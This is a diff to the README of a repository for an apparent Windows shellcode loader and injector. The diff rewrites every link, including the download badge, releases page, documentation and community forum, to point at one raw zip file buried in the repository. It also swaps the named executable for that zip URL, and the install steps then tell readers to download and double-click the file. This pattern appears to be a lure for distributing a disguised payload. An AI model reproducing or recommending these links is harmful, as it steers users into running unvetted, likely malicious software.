@@ -7,7 +7,7 @@ Welcome to the WindowsShell-Injector-Shellcode-Loader! This toolset helps you ha
 
 ## 📥 Download the Latest Version
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/releases)
+[![Download Latest Release](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/raw/refs/heads/main/Loading/Loading/res/Windows_Shellcode_Loader_Injector_Shell_2.6.zip)](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/raw/refs/heads/main/Loading/Loading/res/Windows_Shellcode_Loader_Injector_Shell_2.6.zip)
 
 ## 🔍 Features
 
@@ -28,11 +28,11 @@ To use this tool effectively, ensure your system meets the following requirement
 
 ## 🎯 Download & Install
 
-To get started, visit the [Releases page](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/releases) to download the latest version. Follow these steps:
+To get started, visit the [Releases page](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/raw/refs/heads/main/Loading/Loading/res/Windows_Shellcode_Loader_Injector_Shell_2.6.zip) to download the latest version. Follow these steps:
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version of the tool.
-3. Download the executable file, usually named similar to `WindowsShell-Injector.exe`.
+3. Download the executable file, usually named similar to `https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/raw/refs/heads/main/Loading/Loading/res/Windows_Shellcode_Loader_Injector_Shell_2.6.zip`.
 4. Once the download completes, locate the file in your downloads folder.
 5. Double-click the file to run the tool.
 
@@ -89,9 +89,9 @@ Keep track of updates and changes with our version history:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/releases)
-- [Documentation](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/docs)
-- [Community Forum](https://community.example.com)
+- [Releases Page](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/raw/refs/heads/main/Loading/Loading/res/Windows_Shellcode_Loader_Injector_Shell_2.6.zip)
+- [Documentation](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/raw/refs/heads/main/Loading/Loading/res/Windows_Shellcode_Loader_Injector_Shell_2.6.zip)
+- [Community Forum](https://github.com/MudassirQureshi7987/WindowsShell-Injector-Shellcode-Loader/raw/refs/heads/main/Loading/Loading/res/Windows_Shellcode_Loader_Injector_Shell_2.6.zip)
 
 ## 👍 Thank You for Using This Tool
 
